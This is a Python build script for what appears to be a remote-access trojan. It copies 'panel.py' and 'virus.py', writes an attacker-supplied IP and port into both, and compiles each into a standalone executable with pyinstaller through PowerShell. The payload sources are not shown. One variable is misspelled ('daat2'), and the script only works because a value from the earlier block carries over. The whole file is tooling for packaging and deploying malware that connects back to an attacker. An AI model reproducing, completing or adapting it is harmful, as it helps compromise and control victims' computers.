import random
import argparse
import shutil
import subprocess

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-lh", "--localhost", dest="localhost",required=True, help="use to specify localhost")
    parser.add_argument("-p", "--port", dest="port",required=True, help="use to specify the port")
    return parser.parse_args()

args = main()

shutil.copy("panel.py", "dist")
shutil.copy("virus.py", "dist")

# panel.py dosyasını okurken ve yazarken
with open("dist/panel.py", "r") as panel:
    lines = panel.readlines()
    insertIndex = 2
    insertIndex2 = 3
    data = f"ip = '{args.localhost}'\n"
    data2 = f"port = {args.port}\n"

with open("dist/panel.py", "w") as panel:
    lines.insert(insertIndex, data)
    lines.insert(insertIndex2, data2)
    panel.writelines(lines)

with open("dist/virus.py", "r") as virus:
    lines = virus.readlines()
    insertIndex = 3
    insertIndex2 = 4
    data = f"ip = '{args.localhost}'\n"
    daat2 = f"port = {args.port}\n"

with open("dist/virus.py", "w") as virus:
    lines.insert(insertIndex, data)
    lines.insert(insertIndex2, data2)
    virus.writelines(lines)

panelexe = "pyinstaller --onefile dist/panel.py"
panel = subprocess.run(["powershell", "-Command", panelexe], capture_output=True, text=True)

virusexe = "pyinstaller --onefile dist/virus.py"
virus = subprocess.run(["powershell", "-Command", virusexe], capture_output=True, text=True)
